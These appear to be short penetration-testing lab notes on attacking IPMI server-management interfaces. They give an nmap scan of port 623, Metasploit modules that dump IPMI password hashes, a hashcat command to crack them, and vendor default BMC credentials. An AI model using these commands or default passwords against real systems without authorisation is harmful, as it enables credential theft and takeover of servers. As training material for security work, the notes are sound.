```bash
# nmap enumartion
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.loca

# use with metasploit for recon
auxiliary/scanner/ipmi/ipmi_version
# use with metasploit for dumping hashes
auxiliary/scanner/ipmi/ipmi_dumphashes

# to crack hashes 
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```
## Password to keep in mind

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|
